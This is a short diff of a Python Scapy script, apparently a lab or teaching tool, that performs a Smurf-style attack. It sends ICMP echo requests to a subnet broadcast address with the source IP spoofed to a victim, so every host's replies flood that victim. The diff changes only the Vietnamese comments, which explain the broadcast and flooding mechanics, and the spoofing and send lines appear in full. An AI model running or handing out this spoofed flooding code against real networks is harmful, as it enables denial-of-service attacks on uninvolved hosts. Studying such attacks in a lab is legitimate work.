@@ -24,7 +24,9 @@ def main():
                     help="So goi echo request gui di")
     args = ap.parse_args()
 
-    # src = nan nhan (gia mao) -> moi echo-reply se doi ve nan nhan, khong ve attacker
+    # Gui o tang 3: Scapy tu nhan ra .255 la dia chi broadcast cua mang con
+    # va dua khung ra voi MAC dich = ff:ff:ff:ff:ff:ff -> bridge flood toi moi host.
+    # src IP = nan nhan (gia mao) nen moi echo-reply doi ve nan nhan.
     pkt = IP(src=args.victim, dst=args.broadcast) / ICMP()
     send(pkt, count=args.count, verbose=0)
 
